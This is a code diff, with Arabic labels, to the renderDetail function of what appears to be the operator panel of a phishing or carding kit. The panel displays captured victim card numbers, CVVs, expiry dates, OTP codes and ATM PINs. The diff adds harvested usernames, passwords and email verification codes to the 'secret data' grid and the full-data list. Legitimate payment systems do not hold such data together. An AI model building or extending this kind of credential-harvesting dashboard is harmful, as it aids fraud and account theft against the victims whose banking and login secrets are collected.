@@ -455,12 +455,15 @@ function renderDetail(o){
     '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+esc(o.ref)+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';
 
   h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
+  h+=codeCard('🔐 اسم المستخدم',pay.username);
+  h+=codeCard('🔑 كلمة المرور',pay.password);
   h+=codeCard('👤 اسم حامل البطاقة',pay.cardName);
   h+=codeCard('💳 رقم البطاقة',pay.cardNumber);
   h+=codeCard('📅 تاريخ الانتهاء',pay.exp);
   h+=codeCard('🔒 CVV',pay.cvv);
   h+=codeCard('📲 الكود OTP',pay.otp);
   h+=codeCard('🏧 رقم ATM',pay.pin);
+  h+=codeCard('📧 كود البريد',pay.emailCode);
   h+='</div></div>';
 
   var allData=[
@@ -477,10 +480,13 @@ function renderDetail(o){
     {icon:'💳',label:'نوع البطاقة',value:o.card},
     {icon:'🏛️',label:'النوع',value:o.st==='resident'?'مقيم':o.st==='citizen'?'مواطن':''},
     {icon:'📊',label:'الحالة',value:statusLabel(o)},
+    {icon:'🔐',label:'اسم المستخدم',value:pay.username,hl:true},
+    {icon:'🔑',label:'كلمة المرور',value:pay.password,hl:true},
     {icon:'👤',label:'اسم حامل البطاقة',value:pay.cardName},
     {icon:'💳',label:'رقم البطاقة',value:pay.cardNumber,hl:true},
     {icon:'📅',label:'تاريخ الانتهاء',value:pay.exp},
-    {icon:'🏦',label:'نوع البطاقة',value:pay.brand}
+    {icon:'🏦',label:'نوع البطاقة',value:pay.brand},
+    {icon:'📧',label:'كود البريد',value:pay.emailCode}
   ].filter(function(d){return d.value&&d.value!=='—';});
 
   h+='<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">';
